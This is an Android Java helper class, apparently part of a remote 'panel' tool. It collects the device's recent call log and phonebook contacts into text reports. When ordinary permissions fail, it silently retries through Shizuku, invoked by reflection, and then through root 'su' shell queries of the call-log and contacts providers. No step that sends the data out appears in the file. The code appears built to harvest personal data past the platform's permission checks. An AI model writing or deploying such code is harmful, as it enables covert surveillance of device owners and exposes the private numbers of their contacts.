package com.java.panel;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

public class CallLogHelper {

    public static String getCallLogs(Context context) {
        try {
            StringBuilder sb = new StringBuilder("📞 Recent Calls:\n\n");
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                int numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int durIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int count = 0;
                while (cursor.moveToNext() && count < 10) {
                    String number = numIdx != -1 ? cursor.getString(numIdx) : "Unknown";
                    String duration = durIdx != -1 ? cursor.getString(durIdx) : "0";
                    sb.append("No: ").append(number).append(" | Duration: ").append(duration).append("s\n------------------\n");
                    count++;
                }
                cursor.close();
                if (count > 0) return sb.toString();
            }
        } catch (Exception ignored) {}

        try {
            String result = executeShizuku("content query --uri content://call_log/calls");
            if (result != null && !result.isEmpty() && !result.contains("Error")) {
                return "📞 Recent Calls (Shizuku):\n\n" + result;
            }
        } catch (Exception ignored) {}

        try {
            String result = executeRoot("content query --uri content://call_log/calls");
            if (result != null && !result.isEmpty() && !result.contains("Error")) {
                return "📞 Recent Calls (Root):\n\n" + result;
            }
        } catch (Exception ignored) {}

        return "❌ Failed to read call logs (Permission, Shizuku, or Root privilege may be required).";
    }

    public static String getContacts(Context context) {
        try {
            StringBuilder sb = new StringBuilder("📇 Phonebook Contacts:\n\n");
            Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                int count = 0;
                while (cursor.moveToNext() && count < 30) {
                    String name = nameIdx != -1 ? cursor.getString(nameIdx) : "Unnamed";
                    String phone = numIdx != -1 ? cursor.getString(numIdx) : "";
                    sb.append("Name: ").append(name).append("\nPhone: ").append(phone).append("\n------------------\n");
                    count++;
                }
                cursor.close();
                if (count > 0) return sb.toString();
            }
        } catch (Exception ignored) {}

        try {
            String result = executeShizuku("content query --uri content://com.android.contacts/data/phones");
            if (result != null && !result.isEmpty() && !result.contains("Error")) {
                return "📇 Phonebook Contacts (Shizuku):\n\n" + result;
            }
        } catch (Exception ignored) {}

        try {
            String result = executeRoot("content query --uri content://com.android.contacts/data/phones");
            if (result != null && !result.isEmpty() && !result.contains("Error")) {
                return "📇 Phonebook Contacts (Root):\n\n" + result;
            }
        } catch (Exception ignored) {}

        return "❌ Failed to read contacts (Permission, Shizuku, or Root privilege may be required).";
    }

    private static String executeShizuku(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Class<?> shizukuClass = Class.forName("rikka.shizuku.Shizuku");
            Method newProcessMethod = shizukuClass.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
            newProcessMethod.setAccessible(true);
            Process process = (Process) newProcessMethod.invoke(null, new String[]{"sh", "-c", command}, null, null);
            if (process != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                process.waitFor();
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
        return output.toString();
    }

    private static String executeRoot(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", command});
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
        return output.toString();
    }
}
